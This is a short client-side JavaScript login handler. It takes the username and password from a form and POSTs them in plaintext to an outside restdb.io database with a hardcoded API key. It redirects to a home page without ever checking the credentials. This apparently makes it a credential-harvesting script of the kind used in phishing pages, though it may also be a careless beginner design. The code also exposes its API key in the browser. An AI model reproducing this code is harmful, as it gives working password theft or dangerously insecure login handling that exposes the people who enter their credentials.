document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission
  
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
  
    // Create an object with the data to be sent to the database
    const data = {
      username: username,
      password: password,
    };
  
    const apiUrl = 'https://ipdatabase-b530.restdb.io/rest/userdatabase';
    // Make a POST request to update the database
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-apikey': '65b74f425a960f46217795a7',
      },
      body: JSON.stringify(data),
    })
      .then(response => response.json())
      .then(responseData => {
        // Handle the response data if needed
        console.log(responseData);
        
        // Redirect to the home page after successful login
        window.location.href = 'home.html';
      })
      .catch(error => {
        console.error('Error:', error);
      });
  });
  